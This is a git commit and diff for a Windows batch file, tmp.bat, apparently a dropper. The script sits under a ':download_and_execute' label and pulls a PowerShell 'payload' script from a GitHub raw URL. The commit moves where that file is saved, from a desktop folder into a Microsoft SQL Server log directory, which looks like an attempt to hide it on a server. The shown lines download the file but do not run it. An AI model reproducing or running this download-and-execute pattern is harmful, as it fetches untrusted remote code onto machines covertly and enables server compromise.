c7a2ebae41089250f6ec26704581474666942c3e
dyaa1997dyaa <119899779+dyaa1997dyaa@users.noreply.github.com>
2024-10-23 06:32:38 -0700

    Update tmp.bat

--- tmp.bat
+++ tmp.bat
@@ -1,7 +1,7 @@
 @echo off
 :download_and_execute
 set payloadUrl=https://raw.githubusercontent.com/dyaa1997dyaa/tmp/main/tmpxvrt.ps1
-set output="C:\Users\admin\Desktop\EDU\tmpxvrt.ps1"
+set output="D:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Log\tmpxvrt.ps1"
 
 
 powershell.exe -Command "Invoke-WebRequest -Uri '%payloadUrl%' -OutFile '%output%'"
